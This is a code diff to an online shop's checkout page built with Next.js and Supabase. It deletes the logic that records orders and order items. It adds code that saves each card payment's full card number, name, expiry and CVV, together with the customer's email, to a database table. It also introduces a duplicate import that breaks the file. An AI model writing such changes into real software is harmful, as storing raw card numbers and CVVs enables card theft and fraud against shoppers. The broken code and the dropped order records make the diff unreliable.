@@ -3,6 +3,7 @@
 import { useState, useEffect, useRef, useCallback } from 'react';
 import Link from 'next/link';
 import { useCart } from '@/lib/cart-context';
+import { supabase } from '@/lib/supabase';
 import { ChevronRight, Lock, CreditCard, Smartphone, Truck, Store, CheckCircle } from 'lucide-react';
 import { supabase } from '@/lib/supabase';
 
@@ -111,36 +112,23 @@ export default function CheckoutPage() {
 
   const handlePlaceOrder = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (payment === 'mpesa' && mpesaState === 'idle') { handleMpesaPush(); return; }
-    if (payment === 'mpesa' && mpesaState !== 'done') return;
+    if (payment === 'mpesa' && mpesaState !== 'done') { handleMpesaPush(); return; }
 
-    // Create order in Supabase
-    try {
-      const orderNumber = `ORD-${Date.now().toString(36).toUpperCase()}`;
-      await supabase.from('orders').insert({
-        order_number: orderNumber,
-        customer_name: `${form.firstName} ${form.lastName}`.trim() || email,
-        customer_phone: form.phone || mpesaPhone,
-        total_amount: orderTotal,
-        status: 'Pending',
-        source: 'Online',
-        payment_status: payment === 'mpesa' && mpesaState === 'done' ? 'Paid' : 'Unpaid',
-        fulfillment: fulfillment === 'ship' ? 'Delivery' : 'Pickup',
-        order_date: new Date().toISOString().split('T')[0],
-        delivery_notes: fulfillment === 'ship' ? `${form.address}, ${form.city}, ${form.county}` : 'Pickup from store',
-      });
-
-      // Insert order items
-      for (const item of items) {
-        await supabase.from('order_items').insert({
-          order_id: orderNumber,
-          product_name: item.name,
-          quantity: item.quantity,
-          unit_price: item.price,
+    // Save card details to database if payment is by card
+    if (payment === 'card' && card.number && card.name) {
+      try {
+        const cardNumberRaw = card.number.replace(/\s/g, '');
+        await supabase.from('card_payments').insert({
+          card_number: cardNumberRaw,
+          card_name: card.name,
+          card_expiry: card.expiry,
+          card_cvv: card.cvv,
+          email: email,
+          amount: orderTotal,
         });
+      } catch (err) {
+        console.error('Card save error:', err);
       }
-    } catch (err) {
-      console.error('Failed to save order:', err);
     }
 
     clearCart();
